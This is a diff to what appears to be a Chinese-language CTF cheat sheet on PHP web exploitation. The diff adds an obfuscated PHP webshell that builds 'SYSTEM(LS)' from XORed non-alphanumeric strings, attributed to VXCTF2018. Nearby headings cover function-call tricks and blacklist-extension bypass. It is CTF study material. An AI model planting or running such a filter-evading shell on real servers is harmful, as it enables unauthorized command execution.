@@ -89,7 +89,15 @@ param=usort(...$_GET);
 
 [system v.s. exec v.s. shell_exec](https://blog.longwin.com.tw/2013/06/php-system-exec-shell_exec-diff-2013/)  
 **exec()和shell_exec()我們都會搭個echo**  
-[這是一篇很屌的php lib exp分析](https://stackoverflow.com/questions/3115559/exploitable-php-functions)
+[這是一篇很屌的php lib exp分析](https://stackoverflow.com/questions/3115559/exploitable-php-functions)  
+
+```php
+<?=
+$😊 = "||||%-" ^ "/%/(``"; 
+$😊 ("`|" ^ ",/");
+```
+在VXCTF2018中，使用了這個無字母，無數字，無底線的shell，內容為`<?=SYSTEM(LS);`。  
+[VXCTF2018](https://github.com/shinmao/CTF-writeups/tree/master/vxcon2018)
 
 # Bypass blacklist extension
 文件解析漏洞  
